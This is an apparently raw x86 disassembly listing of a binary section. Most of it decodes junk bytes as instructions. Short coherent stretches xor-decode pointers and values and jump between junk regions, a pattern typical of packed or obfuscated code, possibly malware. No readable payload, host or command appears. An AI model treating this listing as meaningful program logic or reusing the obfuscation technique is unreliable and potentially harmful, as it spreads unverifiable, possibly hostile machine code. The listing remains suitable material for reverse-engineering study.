  4028e2:	adc    eax,0x591390fa
  4028e7:	sti    
  4028e8:	fld    QWORD PTR [ebp+0x7c]
  4028eb:	xlat   BYTE PTR ds:[ebx]
  4028ec:	dec    eax
  4028ed:	sbb    BYTE PTR [esi],cl
  4028ef:	or     DWORD PTR [eax+0x6934c2bf],0x44
  4028f6:	inc    ebp
  4028f7:	sbb    eax,0xa78261a0
  4028fc:	ret    
  4028fd:	popf   
  4028fe:	add    al,BYTE PTR [ebx]
  402900:	mov    edx,0x37ba6bf4
  402905:	dec    eax
  402906:	stos   BYTE PTR es:[edi],al
  402907:	xchg   edi,eax
  402908:	or     ecx,DWORD PTR [ebp-0x54]
  40290b:	and    eax,0x4149be2f
  402910:	into   
  402911:	adc    eax,0xe435bad8
  402916:	mov    WORD PTR [eax-0x78],?
  402919:	(bad)  
  40291a:	push   cs
  40291b:	scas   eax,DWORD PTR es:[edi]
  40291c:	add    BYTE PTR [ebx+0x6e],dl
  40291f:	inc    eax
  402920:	call   0xed07711f
  402925:	cli    
  402926:	sub    BYTE PTR [esi],bl
  402928:	adc    ch,dh
  40292a:	inc    ebx
  40292b:	xor    BYTE PTR [ebx-0x383ca6f8],ch
  402931:	push   0xffffffab
  402933:	lods   al,BYTE PTR ds:[esi]
  402934:	cmp    al,BYTE PTR [edx+esi*8]
  402937:	retf   0x78a
  40293a:	std    
  40293b:	cmp    ah,al
  40293d:	pop    ebx
  40293e:	xor    eax,esi
  402940:	cmp    ecx,esi
  402942:	xor    eax,0x97b2a273
  402947:	jae    0x4029b2
  402949:	ins    BYTE PTR es:[edi],dx
  40294a:	rcl    BYTE PTR [ebp+0x1825c78d],1
  402950:	in     eax,dx
  402951:	lods   al,BYTE PTR ds:[esi]
  402952:	dec    edx
  402953:	ror    DWORD PTR [esi-0x27eb3082],1
  402959:	adc    BYTE PTR [esi-0x10],al
  40295c:	dec    esi
  40295d:	dec    eax
  40295e:	cmp    esp,ebp
  402960:	lahf   
  402961:	xor    ch,BYTE PTR [eax+0x62]
  402964:	ja     0x402914
  402966:	add    bh,al
  402968:	jno    0x4029ca
  40296a:	jle    0x40292a
  40296c:	pusha  
  40296d:	cdq    
  40296e:	mov    esi,0x4f7c1305
  402973:	leave  
  402974:	mov    ecx,0x92798d68
  402979:	push   cs
  40297a:	retf   
  40297b:	cli    
  40297c:	mov    eax,ds:0x9af6a897
  402981:	mov    WORD PTR [edi+0x1a987efc],es
  402987:	enter  0x364c,0x64
  40298b:	ins    DWORD PTR es:[edi],dx
  40298c:	std    
  40298d:	sub    ch,BYTE PTR [edx]
  40298f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402990:	addr16 imul esp,esp,0x1b41d2c9
  402997:	(bad)  
  402998:	fdiv   QWORD PTR [eax]
  40299a:	shr    BYTE PTR [eax],0xf7
  40299d:	add    DWORD PTR [ebx+0x20],0xfbeafef7
  4029a4:	push   ebx
  4029a5:	dec    esi
  4029a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029a7:	retf   
  4029a8:	sbb    al,0x6e
  4029aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029ab:	adc    edi,DWORD PTR [ebp-0x39f1a4a9]
  4029b1:	(bad)  
  4029b3:	mov    esp,0x23a2345d
  4029b8:	(bad)  
  4029b9:	ss test eax,0x67aefffa
  4029bf:	adc    dl,ah
  4029c1:	rol    BYTE PTR [edi-0x31],1
  4029c4:	retf   0x19c3
  4029c7:	sub    eax,0xb22f4fc6
  4029cc:	or     BYTE PTR [edx+0x3a],cl
  4029cf:	repz dec edx
  4029d1:	push   ebp
  4029d2:	and    esi,DWORD PTR [eax-0x29f68ce5]
  4029d8:	dec    ecx
  4029d9:	push   eax
  4029da:	push   ss
  4029db:	sub    bl,BYTE PTR [eax]
  4029dd:	sub    ebx,ebp
  4029df:	ja     0x402961
  4029e1:	inc    edx
  4029e2:	push   esp
  4029e3:	mov    ebx,0x21aab316
  4029e8:	or     esi,DWORD PTR [ecx+ecx*2]
  4029eb:	xchg   edx,eax
  4029ec:	test   al,0x4f
  4029ee:	sbb    eax,0x86e498b2
  4029f3:	lahf   
  4029f4:	ficomp WORD PTR [eax]
  4029f6:	jl     0x4029dd
  4029f8:	pusha  
  4029f9:	loop   0x4029a4
  4029fb:	ret    
  4029fc:	fsub   QWORD PTR [eax-0x1cff3928]
  402a02:	push   edi
  402a03:	loop   0x402a11
  402a05:	cmp    ebp,DWORD PTR [eax-0x29a0228e]
  402a0b:	fisub  WORD PTR [ebp-0x9]
  402a0e:	adc    BYTE PTR [esi],bh
  402a10:	sar    al,0x23
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	sbb    esp,edx
  402a36:	mov    ebp,0x7e0daac0
  402a3b:	jle    0x402a37
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a4b
  402a41:	cli    
  402a42:	sbb    BYTE PTR [ebx+0x3],ch
  402a45:	jl     0x402abd
  402a47:	push   edi
  402a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a49:	rcr    DWORD PTR [edi+0x36],1
  402a4c:	mov    ds:0x95c9cdfd,al
  402a51:	sti    
  402a52:	jge    0x402a3b
  402a54:	xor    ah,BYTE PTR [esi-0x36752fee]
  402a5a:	push   ecx
  402a5b:	mov    eax,ds:0xcb28c968
  402a60:	pop    ebx
  402a61:	fstp   QWORD PTR [ecx-0x5b60baf8]
  402a67:	jne    0x402a44
  402a69:	sbb    BYTE PTR [eax+0x51],ch
  402a6c:	push   ebx
  402a6d:	and    ah,al
  402a6f:	retf   
  402a70:	and    al,0x8a
  402a72:	test   eax,edi
  402a74:	or     al,0x12
  402a76:	xlat   BYTE PTR ds:[ebx]
  402a77:	imul   edi,DWORD PTR [esi],0x64
  402a7a:	jnp    0x402ae5
  402a7c:	cmp    ebx,DWORD PTR ds:[ecx-0x4b]
  402a80:	mov    esp,0x658b9d99
  402a85:	xchg   ecx,eax
  402a86:	dec    ebx
  402a87:	mov    ds:0xaa31a1b2,eax
  402a8c:	xor    BYTE PTR [edi+ebx*1+0x51308d5c],ah
  402a93:	dec    ebp
  402a94:	push   0xffffffec
  402a96:	pop    ss
  402a97:	int3   
  402a98:	adc    dh,BYTE PTR [esi-0x74]
  402a9b:	lahf   
  402a9c:	or     eax,0xb9e904bb
  402aa1:	push   ss
  402aa2:	pop    edx
  402aa3:	sbb    edi,DWORD PTR [ebp+ebp*8+0x36]
  402aa7:	(bad)  
  402aa8:	jo     0x402aec
  402aaa:	or     eax,0x4b11cf18
  402aaf:	lea    ebx,[edi+eax*8]
  402ab2:	push   eax
  402ab3:	enter  0x54bb,0x3d
  402ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ab8:	push   es
  402ab9:	out    0x64,al
  402abb:	xchg   ecx,eax
  402abc:	inc    esp
  402abd:	ret    0x3c4e
  402ac0:	inc    eax
  402ac1:	pop    ecx
  402ac2:	mov    eax,0x26762b7e
  402ac7:	and    ebx,eax
  402ac9:	fwait
  402aca:	jp     0x402b0e
  402acc:	add    al,0x4
  402ace:	lods   eax,DWORD PTR ds:[esi]
  402acf:	xor    eax,0x8ed14715
  402ad4:	mov    DWORD PTR [ebp+0x8120add],0x843c707f
  402ade:	ja     0x402ab9
  402ae0:	out    dx,al
  402ae1:	imul   esp,DWORD PTR [ebx],0x60
  402ae4:	xchg   ecx,eax
  402ae5:	les    edi,FWORD PTR [ebx-0x29]
  402ae8:	xor    edx,edx
  402aea:	call   0xb70e:0xcece1f11
  402af1:	mov    bl,0xe5
  402af3:	adc    cl,BYTE PTR [edi-0x1e]
  402af6:	xlat   BYTE PTR ds:[ebx]
  402af7:	adc    BYTE PTR [esi-0x4d],bl
  402afa:	sbb    DWORD PTR [edi+0x5bae3738],edi
  402b00:	sub    esi,DWORD PTR [edx+0x22f71079]
  402b06:	push   ds
  402b07:	(bad)  
  402b08:	push   cs
  402b09:	or     DWORD PTR [ecx+0x62832fc8],0xffffffaa
  402b10:	mov    cl,0xc9
  402b12:	je     0x402b32
  402b14:	push   edi
  402b15:	mov    esp,0x3d2d3242
  402b1a:	sub    edi,DWORD PTR [ebx+0x5]
  402b1d:	or     al,0x2
  402b1f:	xchg   ebp,eax
  402b20:	push   edi
  402b21:	aaa    
  402b22:	and    BYTE PTR [eax-0xc907627],dl
  402b28:	pop    ebx
  402b29:	add    al,BYTE PTR [esi-0x5fbfbd68]
  402b2f:	ror    DWORD PTR [ebp-0x68],cl
  402b32:	iret   
  402b33:	cmp    DWORD PTR [eax+0x5d],eax
  402b36:	(bad)  
  402b37:	xchg   ebx,eax
  402b38:	cmc    
  402b39:	push   edi
  402b3a:	aaa    
  402b3b:	and    BYTE PTR [edx-0x66],ch
  402b3e:	jno    0x402b8f
  402b40:	sbb    DWORD PTR [edx],ebx
  402b42:	(bad)  
  402b44:	leave  
  402b45:	pop    es
  402b46:	in     al,0x6e
  402b48:	and    DWORD PTR ds:[ecx],edi
  402b4b:	test   BYTE PTR [esi+0x1a32ea59],dl
  402b51:	mov    eax,ds:0x2f34e906
  402b56:	and    eax,0xc978979f
  402b5b:	jmp    0xa2f1:0xaed62c39
  402b62:	inc    bl
  402b64:	xor    al,0x4a
  402b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b67:	xlat   BYTE PTR ds:[ebx]
  402b68:	mov    ?,WORD PTR [ecx]
  402b6a:	mov    dl,0x37
  402b6c:	lock inc ecx
  402b6e:	jg     0x402b79
  402b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b71:	mov    al,ds:0xf8cee5f6
  402b76:	mov    eax,0x66d73315
  402b7b:	pushf  
  402b7c:	mov    edx,0x4debc9c
  402b81:	xchg   esp,eax
  402b82:	in     al,dx
  402b83:	hlt    
  402b84:	mov    esi,0x534f8889
  402b89:	xchg   BYTE PTR [eax+0x6f],cl
  402b8c:	ret    
  402b8d:	sbb    BYTE PTR [ebp-0x450bf049],dh
  402b93:	dec    esi
  402b94:	jl     0x402b85
  402b96:	addr16 ds jp 0x402b99
  402b9a:	lock aad 0xfc
  402b9d:	inc    ebx
  402b9e:	jo     0x402be9
  402ba0:	or     ah,cl
  402ba2:	scas   al,BYTE PTR es:[edi]
  402ba3:	jb     0x402be4
  402ba5:	shr    BYTE PTR es:[edx],cl
  402ba8:	sub    eax,0x4fa15c25
  402bad:	cmp    esp,DWORD PTR [edx+0x4]
  402bb0:	sbb    ebx,DWORD PTR [ebp-0x6e]
  402bb3:	dec    edi
  402bb4:	push   eax
  402bb5:	dec    edi
  402bb6:	mov    WORD PTR [edi+0x5139d452],cs
  402bbc:	jo     0x402c1f
  402bbe:	bound  ecx,QWORD PTR [esi-0x2d]
  402bc1:	rol    BYTE PTR [esp+ecx*1-0x7b],cl
  402bc5:	ror    BYTE PTR [edi],0x84
  402bc8:	sub    BYTE PTR [eax],al
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	xchg   ecx,eax
  402c12:	sar    bh,0x9b
  402c15:	or     edi,DWORD PTR ss:[esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bdf
  402c1e:	or     al,0xad
  402c21:	(bad)  
  402c22:	xor    dl,ah
  402c24:	sbb    eax,0xc6a916d3
  402c29:	inc    edx
  402c2a:	push   edx
  402c2b:	in     eax,0xd7
  402c2d:	rcr    DWORD PTR [edi+0x13d0b623],cl
  402c33:	inc    edx
  402c34:	je     0x402be9
  402c36:	adc    al,0xe8
  402c38:	xor    DWORD PTR [eax-0x876bd11],edi
  402c3e:	xchg   esp,eax
  402c3f:	stos   BYTE PTR es:[edi],al
  402c40:	push   eax
  402c41:	adc    DWORD PTR [ecx+0x5e],esi
  402c44:	cmp    ecx,DWORD PTR [eax]
  402c46:	rcr    dh,1
  402c48:	ss mov ecx,0x5cec4b8c
  402c4e:	and    bl,BYTE PTR [eax+0x4a]
  402c51:	(bad)  
  402c52:	ja     0x402c4f
  402c54:	(bad)  
  402c55:	mov    eax,ds:0x310a67c3
  402c5a:	fcmovnb st,st(3)
  402c5c:	inc    ebp
  402c5d:	jle    0x402c45
  402c5f:	pop    edi
  402c60:	xchg   edx,eax
  402c61:	pop    ds
  402c62:	jmp    0x8244:0xe4d8d2f
  402c69:	pushf  
  402c6a:	jl     0x402c15
  402c6c:	mov    esp,edi
  402c6e:	in     eax,0x8b
  402c70:	mov    dl,0x95
  402c72:	mov    es,WORD PTR [ecx+0x12]
  402c75:	test   esi,esi
  402c77:	jae    0x402caa
  402c79:	shl    BYTE PTR [eax-0x22130c11],0x8e
  402c80:	test   al,0x9b
  402c82:	xlat   BYTE PTR ds:[ebx]
  402c83:	cmp    BYTE PTR [edx-0x5047b8c7],bl
  402c89:	leave  
  402c8a:	push   ds
  402c8b:	jae    0x402cf4
  402c8d:	ds sar dh,cl
  402c90:	mov    eax,0x17b8573f
  402c95:	push   ebx
  402c96:	loope  0x402cc8
  402c98:	pop    ss
  402c99:	stos   DWORD PTR es:[edi],eax
  402c9a:	add    DWORD PTR [eax],esp
  402c9c:	ret    
  402c9d:	addr16 hlt 
  402c9f:	dec    ebx
  402ca0:	popa   
  402ca1:	jl     0x402ce9
  402ca3:	outs   dx,DWORD PTR ds:[esi]
  402ca4:	fbstp  TBYTE PTR [ecx+0x80e73bf]
  402caa:	loop   0x402c4f
  402cac:	mov    bl,0xba
  402cae:	adc    al,0x22
  402cb0:	les    eax,FWORD PTR [ebx+0x5a]
  402cb3:	imul   ecx,edi,0xf2e10f12
  402cb9:	inc    esp
  402cba:	mov    edi,0x9d2fe567
  402cbf:	jb     0x402d37
  402cc1:	test   eax,0x59d0113b
  402cc6:	mov    DWORD PTR [ecx],esp
  402cc8:	mov    cl,0x2
  402cca:	sub    al,0xb7
  402ccc:	jb     0x402c54
  402cce:	dec    ebx
  402ccf:	lods   al,BYTE PTR ds:[esi]
  402cd0:	pushf  
  402cd1:	ds mov cl,0xac
  402cd4:	or     bl,cl
  402cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd7:	mov    al,ds:0x2d00b0e2
  402cdc:	mov    bl,0xd1
  402cde:	mov    bh,0x82
  402ce0:	mov    eax,ds:0x2dfa57c4
  402ce5:	jno    0x402d14
  402ce7:	loopne 0x402d65
  402ce9:	mov    eax,0xc85fa954
  402cee:	pop    edx
  402cef:	(bad)  
  402cf0:	add    bh,BYTE PTR [edx]
  402cf2:	push   ecx
  402cf3:	(bad)  
  402cf4:	xchg   edx,eax
  402cf5:	sub    DWORD PTR [edi+eax*8-0x49],ebp
  402cf9:	leave  
  402cfa:	adc    BYTE PTR [edi],cl
  402cfc:	adc    al,0x4c
  402cfe:	xchg   ebp,eax
  402cff:	aaa    
  402d00:	or     DWORD PTR [ecx+0x212d6e08],eax
  402d06:	jne    0x402d5f
  402d08:	xchg   ebx,eax
  402d09:	mov    al,0x9
  402d0b:	jb     0x402cfa
  402d0d:	dec    edx
  402d0e:	out    dx,eax
  402d0f:	jmp    0x402cef
  402d11:	aad    0xc0
  402d13:	sub    BYTE PTR [esi+0x1b],dh
  402d16:	push   es
  402d17:	jle    0x402cdc
  402d19:	mov    WORD PTR [ebx],fs
  402d1b:	dec    ecx
  402d1c:	test   al,0xad
  402d1e:	sub    edi,edi
  402d20:	adc    bh,BYTE PTR [ebx+0x39b607b1]
  402d26:	mov    edi,0xce7f5fd
  402d2b:	jp     0x402cd2
  402d2d:	mov    fs,WORD PTR [ecx]
  402d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d30:	loopne 0x402d96
  402d32:	pop    esp
  402d33:	mov    cl,0xbf
  402d35:	adc    al,0x8f
  402d37:	out    dx,eax
  402d38:	mov    cs,WORD PTR [ebx+0x6a]
  402d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d3c:	add    al,0xa
  402d3e:	imul   ebx,DWORD PTR [edi+0x14],0x4e
  402d42:	xchg   BYTE PTR [edi-0x7c],dl
  402d45:	loopne 0x402d2b
  402d47:	mov    ds:0xe977db7c,al
  402d4c:	inc    esp
  402d4d:	pop    DWORD PTR [ebp+0x21]
  402d50:	push   ebx
  402d51:	call   0x11ba:0x77f5e93e
  402d58:	jb     0x402d40
  402d5a:	or     BYTE PTR [edi],dl
  402d5c:	mov    eax,0x2156ee1d
  402d61:	stos   BYTE PTR es:[edi],al
  402d62:	inc    ebp
  402d63:	(bad)  
  402d64:	js     0x402dba
  402d66:	neg    DWORD PTR [eax+eax*4]
  402d69:	daa    
  402d6a:	xchg   edi,eax
  402d6b:	fstp   QWORD PTR [esi+0x2ca43e00]
  402d71:	fnsave ds:[edx-0x8]
  402d75:	gs addr16 call 0x9e0500cf
  402d7c:	pusha  
  402d7d:	adc    eax,0xfd8dd7de
  402d82:	jno    0x402da7
  402d84:	sbb    esi,DWORD PTR [esi+edi*4]
  402d87:	daa    
  402d88:	data16 ficomp DWORD PTR [edi+0x4b59ffb5]
  402d8f:	aaa    
  402d90:	pushf  
  402d91:	fwait
  402d92:	or     BYTE PTR [ebp+0x78],0xe8
  402d96:	outs   dx,DWORD PTR ds:[esi]
  402d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d98:	inc    ebp
  402d99:	into   
  402d9a:	ja     0x402dcf
  402d9c:	adc    al,0x21
  402d9e:	dec    ebp
  402d9f:	and    DWORD PTR [ebx+0x2b],esp
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [eax+edi*8+0x50],1
  402de7:	or     al,0xc3
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e14
  402df2:	mov    cl,0xc3
  402df4:	sbb    dh,BYTE PTR [esi]
  402df6:	mov    dl,BYTE PTR [edi-0x26b7d33d]
  402dfc:	dec    ebx
  402dfd:	pop    eax
  402dfe:	int    0x1b
  402e00:	stos   BYTE PTR es:[edi],al
  402e01:	test   ax,0x15a7
  402e05:	adc    edx,DWORD PTR [ecx-0x43fd851b]
  402e0b:	mov    DWORD PTR [esi-0x19],ebp
  402e0e:	jge    0x402e7b
  402e10:	inc    ecx
  402e11:	jns    0x402dd7
  402e13:	push   ecx
  402e14:	out    0x93,eax
  402e16:	fsub   st(5),st
  402e18:	fadd   QWORD PTR [ecx+0x77]
  402e1b:	push   esi
  402e1c:	mov    bl,ah
  402e1e:	dec    ebx
  402e1f:	ds or  eax,0x52305662
  402e25:	stos   BYTE PTR es:[edi],al
  402e26:	fs xchg esp,eax
  402e28:	xchg   ebp,eax
  402e29:	js     0x402e9c
  402e2b:	ror    eax,1
  402e2d:	out    0x50,eax
  402e2f:	dec    eax
  402e30:	test   DWORD PTR es:[eax-0x439dfec5],0x99fe72a0
  402e3b:	les    ecx,FWORD PTR ss:[ebx+0x6e]
  402e3f:	pop    eax
  402e40:	jb     0x402dcf
  402e42:	call   FWORD PTR [esi-0x51]
  402e45:	ins    BYTE PTR es:[edi],dx
  402e46:	fcomip st,st(6)
  402e48:	fsub   QWORD PTR [ecx]
  402e4a:	lods   eax,DWORD PTR ds:[esi]
  402e4b:	sahf   
  402e4c:	repz in al,0x62
  402e4f:	addr16 mov esi,0x21bd09df
  402e55:	outs   dx,BYTE PTR ds:[esi]
  402e56:	(bad)  [ebx+ecx*4-0x11fc6885]
  402e5d:	mov    BYTE PTR [edx],dh
  402e5f:	bnd ja 0x402e65
  402e62:	dec    ebp
  402e63:	lea    esi,[esi-0x3f676d55]
  402e69:	push   ebx
  402e6a:	jge    0x402e52
  402e6c:	outs   dx,DWORD PTR ds:[esi]
  402e6d:	jmp    0xf9e97457
  402e72:	or     DWORD PTR [edx-0x8],0xfee334b3
  402e79:	and    ecx,DWORD PTR [esi+eax*4]
  402e7c:	mov    esp,0x5881b08a
  402e81:	(bad)  
  402e82:	ret    
  402e83:	sub    eax,0xfe31d957
  402e88:	outs   dx,DWORD PTR ds:[esi]
  402e89:	retf   0xec0f
  402e8c:	jns    0x402e5e
  402e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e8f:	or     al,0xed
  402e91:	inc    eax
  402e92:	leave  
  402e93:	add    BYTE PTR [ecx+0x270e2ebb],dh
  402e99:	mov    al,ds:0xdc5d62d3
  402e9e:	cmp    al,BYTE PTR [edi-0x63cf1ceb]
  402ea4:	xchg   esp,eax
  402ea5:	xchg   edx,eax
  402ea6:	sbb    al,0xb3
  402ea8:	lods   eax,DWORD PTR ds:[esi]
  402ea9:	cmc    
  402eaa:	enter  0xd773,0x96
  402eae:	or     al,0x19
  402eb0:	mov    cs,WORD PTR [ecx]
  402eb2:	out    0x81,al
  402eb4:	loopne 0x402e9a
  402eb6:	pop    ebp
  402eb7:	adc    BYTE PTR [eax],bl
  402eb9:	aad    0xdf
  402ebb:	or     eax,0x6f1edf45
  402ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ec1:	imul   edi,DWORD PTR [ebx+ecx*8+0x0],0x1b
  402ec6:	pop    ds
  402ec7:	aad    0xe
  402ec9:	jmp    0x402f08
  402ecb:	sub    BYTE PTR [ebp+ebx*4+0x64],0x99
  402ed0:	ret    
  402ed1:	add    ch,BYTE PTR ds:0xe7fd0dc2
  402ed7:	jmp    0x14a4:0xbaa4ed96
  402ede:	mov    BYTE PTR [edx-0xc],bh
  402ee1:	or     edx,DWORD PTR [edi-0x594387e1]
  402ee7:	fcomip st,st(7)
  402ee9:	mov    ch,0x79
  402eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eec:	enter  0x629b,0x69
  402ef0:	cld    
  402ef1:	jb     0x402f58
  402ef3:	pop    edi
  402ef4:	adc    eax,0x2640bd2
  402ef9:	popa   
  402efa:	mov    cs,WORD PTR [edi+edi*8]
  402efd:	in     eax,0x45
  402eff:	imul   ebx,DWORD PTR es:[edx-0x23],0x49
  402f04:	dec    edx
  402f05:	add    al,0x7e
  402f07:	xchg   ebx,eax
  402f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f09:	sub    bh,0x5c
  402f0c:	fyl2xp1 
  402f0e:	sti    
  402f0f:	xor    DWORD PTR [esi],ebp
  402f11:	mov    al,0x67
  402f13:	out    0x66,al
  402f15:	aam    0x4b
  402f17:	rcr    edi,1
  402f19:	fdivr  DWORD PTR [eax-0x23]
  402f1c:	lods   eax,DWORD PTR ds:[esi]
  402f1d:	jne    0x402f3d
  402f1f:	or     BYTE PTR [edx+0x28],ch
  402f22:	in     eax,0x20
  402f24:	test   DWORD PTR [eax],eax
  402f26:	nop
  402f27:	out    dx,eax
  402f28:	push   DWORD PTR ds:0xe28430c8
  402f2e:	add    al,0xf1
  402f30:	and    ebp,DWORD PTR [eax+ebp*2]
  402f33:	mov    dh,0x75
  402f35:	stc    
  402f36:	clc    
  402f37:	repz pop eax
  402f39:	jle    0x402f1b
  402f3b:	adc    cl,ah
  402f3d:	ror    DWORD PTR [edx+0x5b],0xdc
  402f41:	pop    edx
  402f42:	in     eax,dx
  402f43:	xor    edx,ecx
  402f45:	push   eax
  402f46:	adc    bh,dh
  402f48:	adc    eax,0x9c0eef29
  402f4d:	mov    bl,0xd6
  402f4f:	retf   
  402f50:	leave  
  402f51:	out    0x1c,eax
  402f53:	lds    ebp,FWORD PTR [edi+0x16]
  402f56:	inc    ebp
  402f57:	ss add edx,edi
  402f5a:	jb     0x402fcd
  402f5c:	xchg   edi,eax
  402f5d:	xchg   DWORD PTR [esi],ecx
  402f5f:	stos   BYTE PTR es:[edi],al
  402f60:	xor    edi,DWORD PTR [ebx]
  402f62:	sub    al,0x64
  402f64:	ins    DWORD PTR es:[edi],dx
  402f65:	and    ebx,DWORD PTR [edx+0x122dbee7]
  402f6b:	sbb    BYTE PTR [ecx],al
  402f6d:	inc    ebp
  402f6e:	dec    edi
  402f6f:	lods   eax,DWORD PTR ds:[esi]
  402f70:	mov    ch,BYTE PTR ds:0x8d66a433
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x3d7a5a49]
  402fae:	es (bad) 
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f49
  402fb9:	nop
  402fba:	(bad)  
  402fbb:	int    0xb3
  402fbd:	pushf  
  402fbe:	mov    edx,ecx
  402fc0:	and    dl,dh
  402fc2:	cld    
  402fc3:	arpl   WORD PTR [ecx+0x5a],dx
  402fc6:	mov    ch,0x47
  402fc8:	jns    0x402f6f
  402fca:	jo     0x402fc7
  402fcc:	iret   
  402fcd:	ins    DWORD PTR es:[edi],dx
  402fce:	inc    esi
  402fcf:	scas   eax,DWORD PTR es:[edi]
  402fd0:	cs xchg edi,eax
  402fd2:	repz cwde 
  402fd4:	add    eax,esp
  402fd6:	sbb    cl,dh
  402fd8:	in     al,0x7a
  402fda:	jo     0x402f82
  402fdc:	xor    eax,0x1a8a1045
  402fe1:	rol    BYTE PTR [ecx-0x19],cl
  402fe4:	or     al,0xbb
  402fe6:	popa   
  402fe7:	pop    eax
  402fe8:	in     al,0x28
  402fea:	push   ebp
  402feb:	jno    0x403007
  402fed:	xchg   DWORD PTR [esi],esi
  402fef:	retf   
  402ff0:	fisttp QWORD PTR [ecx+0x2f00856f]
  402ff6:	inc    ebp
  402ff7:	mov    WORD PTR [ebx-0x747db773],cs
  402ffd:	fnstenv [edx]
  402fff:	mov    ecx,0xc1b9c7f4
  403004:	add    cl,BYTE PTR [edx]
  403006:	mov    edx,0x5992d3d0
  40300b:	dec    esi
  40300c:	cli    
  40300d:	jb     0x40306f
  40300f:	cmc    
  403010:	sbb    ch,BYTE PTR [ebx+0x2c]
  403013:	lods   eax,DWORD PTR ds:[esi]
  403014:	fstp   DWORD PTR [ebp-0x3f55f3d9]
  40301a:	and    eax,0xaf9f0c1
  40301f:	prefetchnta BYTE PTR [esi+0x48]
  403023:	dec    ebx
  403024:	icebp  
  403025:	mov    cl,BYTE PTR [eax-0xc]
  403028:	jecxz  0x40307f
  40302a:	and    al,0xe3
  40302c:	cmp    eax,0xa677c4a0
  403031:	push   ebx
  403032:	pop    ds
  403033:	shr    DWORD PTR [ecx+0x29],1
  403036:	cwde   
  403037:	xchg   esi,eax
  403038:	inc    edi
  403039:	jl     0x403050
  40303b:	add    DWORD PTR es:0x7c02ad68,0x27f1fc37
  403046:	out    0x93,eax
  403048:	sahf   
  403049:	jge    0x403063
  40304b:	jmp    0x8de09664
  403050:	int    0x69
  403052:	push   ecx
  403053:	lds    eax,FWORD PTR [ebx+0x2057bde3]
  403059:	mov    al,ds:0xeb20510
